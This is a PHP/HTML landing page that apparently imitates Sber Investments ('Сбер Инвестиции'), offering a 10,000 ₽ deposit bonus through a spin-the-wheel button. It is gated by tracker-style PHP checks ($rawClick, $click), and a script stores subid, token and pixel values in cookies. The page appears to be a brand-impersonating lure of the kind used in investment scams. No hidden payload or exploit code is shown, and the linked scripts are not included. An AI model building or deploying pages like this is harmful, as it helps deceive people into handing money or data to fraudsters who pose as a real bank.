<?php
if (!isset($rawClick) && !isset($click)) {
  die();
}
?>

<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Сбер Инвестиции</title>
    <link rel="icon" href="./img/icons/logo.svg" type="image/x-icon" />
    <link rel="stylesheet" href="styles.css" />
    
    <script type="application/javascript" src="track.js?v=21238"></script>

<script type="application/javascript">
  function getCookie(name) {
    var v = document.cookie.match("(^|;) ?" + name + "=([^;]*)(;|$)");
    return v ? v[2] : null;
  }

  function setCookie(name, value, days) {
    var d = new Date();
    d.setTime(d.getTime() + 24 * 60 * 60 * 1000 * days);
    document.cookie =
      name + "=" + value + ";path=/;expires=" + d.toGMTString();
  }

  function getSubId() {
    var params = new URLSearchParams(document.location.search.substr(1));
    if (!"{subid}".match("{")) {
      return "{subid}";
    }
    var clientSubid =
      '<?php echo isset($client) ? $client->getSubid() : "" ?>';
    if (!clientSubid.match(">")) {
      return clientSubid;
    }
    if (params.get("_subid")) {
      return params.get("_subid");
    }
    if (params.get("subid")) {
      return params.get("subid");
    }
    if (getCookie("subid")) {
      return getCookie("subid");
    }
  }

  function getToken() {
    var params = new URLSearchParams(document.location.search.substr(1));
    if (!"{token}".match("{")) {
      return "{token}";
    }
    var clientToken =
      '<?php echo isset($client) ? $client->getToken() : "" ?>';
    if (!clientToken.match(">")) {
      return clientToken;
    }
    if (params.get("_token")) {
      return params.get("_token");
    }
    if (params.get("token")) {
      return params.get("token");
    }
    if (getCookie("token")) {
      return getCookie("token");
    }
    return null;
  }

  function getPixel() {
    var params = new URLSearchParams(document.location.search.substr(1));
    if (!"{pixel}".match("{")) {
      return "{pixel}";
    }
    if (params.get("pixel")) {
      return params.get("pixel");
    }

    if (getCookie("pixel")) {
      return getCookie("pixel");
    }

    return null;
  }

  if (typeof URLSearchParams === "function") {
    document.addEventListener("DOMContentLoaded", function (event) {
      var params = new URLSearchParams(document.location.search.substr(1));
      var subid = getSubId();
      var token = getToken();
      var pixel = getPixel();

      params.set("_token", token);
      setCookie("pixel", pixel);
      setCookie("token", token);
      setCookie("subid", subid);
      setCookie("_subid", subid);
      
      if (params.get("info")) {
        setCookie("info", params.get("info"), 30); // Срок действия куки - 30 дней
      }
    });
  }

  window.removeEventListener("beforeunload", trackClose);
</script>
    
    
    
  </head>
  <body>
    <header class="header">
      <div class="header__logo">
        <img
          src="./img/icons/Vector.png"
          alt="Logo"
          class="header__logo-img"
        /><span class="header__logo-text"
          >СБЕР <br />
          ИНВЕСТИЦИИ</span
        >
      </div>
    </header>
    <main class="main">
      <section class="main__section primary">
        <div class="main__section-primary__container">
          <span class="main__section-primary__container-item"
            >Бонус к депозиту</span
          >
          <span class="main__section-primary__container-item secondary"
            >10.000 ₽</span
          >
        </div>
      </section>
      <section class="main__section third">
        <div class="main__section-secondary__container">
          <div class="main__section-secondary__container-img-border">
            <img
              src="./img/illustration.png"
              class="main__section-secondary__container-img"
              alt="Border"
            />
          </div>
          <div class="main__section-secondary__container-img-content">
            <div class="main__section-secondary__container-img-wheel">
              <img
                src="./img/Frame-content2.png"
                class="main__section-secondary__container-img"
                alt="Content"
              />
            </div>
          </div>
          <div class="main__section-secondary__container-confetti">
            <img
              src="./img/confettiL.png"
              alt="Confetti Left"
              class="confetti confetti--left"
            />
            <img
              src="./img/confettiR.png"
              alt="Confetti Right"
              class="confetti confetti--right"
            />
          </div>
        </div>
        <div class="main__section-third__container">
          <button class="main__section-third__container-button">КРУТИТЬ</button>
          <p class="main__section-third__container-text">
            ДЛЯ УЧАСТИЯ В АКЦИИ ВЫ ДОЛЖНЫ БЫТЬ СОВЕРШЕННОЛЕТНИМ ГРАЖДАНИНОМ ИЛИ
            РЕЗИДЕНТОМ РФ
          </p>
        </div>
      </section>
    </main>
    <script src="main.js?v=45"></script>
  </body>
</html>
